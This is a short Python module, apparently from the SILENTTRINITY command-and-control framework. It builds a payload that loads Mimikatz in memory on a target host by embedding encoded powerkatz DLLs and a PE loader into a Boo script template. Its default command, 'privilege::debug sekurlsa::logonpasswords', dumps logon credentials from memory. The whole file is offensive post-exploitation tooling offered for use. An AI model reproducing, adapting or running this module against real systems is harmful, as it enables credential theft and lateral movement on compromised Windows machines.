from silenttrinity.core.teamserver.module import Module
from silenttrinity.core.utils import get_path_in_package
from silenttrinity.core.teamserver.utils import dotnet_deflate_and_encode


class STModule(Module):
    def __init__(self):
        self.name = 'boo/mimikatz'
        self.language = 'boo'
        self.description = 'Loads Mimikatz in memory and executes the specified command'
        self.author = '@byt3bl33d3r'
        self.references = []
        self.options = {
            'Command': {
                'Description'   :   'Mimikatz command to run',
                'Required'      :   False,
                'Value'         :   'privilege::debug sekurlsa::logonpasswords'
            }
        }

    def payload(self):
        with open(get_path_in_package('core/teamserver/data/powerkatz_x86.dll'), 'rb') as powerkatz_x86:
            with open(get_path_in_package('core/teamserver/data/powerkatz_x64.dll'), 'rb') as powerkatz_x64:
                with open(get_path_in_package('core/teamserver/data/mimikatz_peloader.dll'), 'rb') as peloader:
                    with open(get_path_in_package('core/teamserver/modules/boo/src/mimikatz.boo')) as module_src:
                        src = module_src.read()
                        src = src.replace("COMPRESSED_PE_x86", dotnet_deflate_and_encode(powerkatz_x86.read()))
                        src = src.replace("COMPRESSED_PE_x64", dotnet_deflate_and_encode(powerkatz_x64.read()))
                        src = src.replace("MIMI_PE_LOADER", dotnet_deflate_and_encode(peloader.read()))
                        src = src.replace("MIMIKATZ_COMMAND", self.options['Command']['Value'])
                        return src
